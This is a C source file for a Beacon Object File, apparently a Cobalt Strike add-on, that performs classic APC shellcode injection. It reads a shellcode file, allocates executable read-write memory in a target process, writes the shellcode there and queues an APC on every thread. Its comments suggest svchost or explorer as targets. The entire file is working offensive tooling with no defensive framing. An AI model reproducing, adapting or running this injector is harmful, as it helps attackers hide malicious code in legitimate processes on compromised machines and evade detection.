/*
 * bof-injectapc <pid> <shellcode-file>
 *
 * Classic APC injection: allocate RWX memory in the target, write the
 * shellcode, then queue an APC to every thread of the process and nudge
 * alertable threads with ResumeThread.  Works best against processes that
 * sit in alertable waits (svchost, explorer, services with thread pools).
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    datap parser;
    int pid;
    char *path;
    int plen = 0;
    unsigned char *sc = NULL;
    unsigned int sclen = 0;
    HANDLE hp, snap;
    LPVOID remote;
    THREADENTRY32 te;
    int queued = 0;

    BeaconDataParse(&parser, args, alen);
    pid  = BeaconDataInt(&parser);
    path = BeaconDataExtract(&parser, &plen);
    if (pid <= 0 || !path || !path[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: injectapc <pid> <shellcode-file>\n");
        return;
    }

    if (bof_read_file(path, &sc, &sclen) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "cannot read %s: %lu\n", path,
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }

    hp = KERNEL32$OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                              PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                              FALSE, (DWORD)pid);
    if (!hp) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess(%d) failed: %lu\n", pid,
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
        return;
    }

    remote = KERNEL32$VirtualAllocEx(hp, NULL, (SIZE_T)sclen,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hp);
        KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
        return;
    }

    if (!KERNEL32$WriteProcessMemory(hp, remote, sc, (SIZE_T)sclen, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hp);
        KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
        return;
    }

    snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "thread snapshot failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hp);
        KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
        return;
    }

    bof_memzero(&te, sizeof(te));
    te.dwSize = sizeof(te);
    if (KERNEL32$Thread32First(snap, &te)) {
        do {
            HANDLE ht;
            if (te.th32OwnerProcessID != (DWORD)pid) continue;
            ht = KERNEL32$OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                                     FALSE, te.th32ThreadID);
            if (!ht) continue;
            if (KERNEL32$QueueUserAPC((PAPCFUNC)remote, ht, 0)) {
                queued++;
                KERNEL32$ResumeThread(ht);
            }
            KERNEL32$CloseHandle(ht);
        } while (KERNEL32$Thread32Next(snap, &te));
    }
    KERNEL32$CloseHandle(snap);
    KERNEL32$CloseHandle(hp);
    KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] %u bytes written to PID %d, APC queued on %d thread(s)\n",
                 sclen, pid, queued);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] remote buffer at 0x%p\n", remote);
}
